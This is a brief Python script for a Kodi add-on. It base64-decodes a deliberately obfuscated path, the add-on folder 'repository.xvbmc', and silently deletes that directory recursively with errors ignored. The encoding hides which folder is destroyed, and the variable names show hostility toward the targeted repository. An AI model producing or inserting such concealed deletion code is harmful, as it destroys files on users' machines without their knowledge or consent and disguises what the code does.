# -*- coding: utf-8 -*-
#!/usr/bin/python
import base64
import xbmc
quitforcing=base64.b64decode('eolc3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkueHZibWM='[3:]).decode('utf-8')
yourcrap=xbmc.translatePath((quitforcing))
xbmc.log(str(yourcrap),level=xbmc.LOGDEBUG)
import os
if os.path.exists(yourcrap):
 import shutil
 xbmc.log('DEL(%s)'%(yourcrap),xbmc.LOGWARNING)
 shutil.rmtree(yourcrap,ignore_errors=True)
#EOF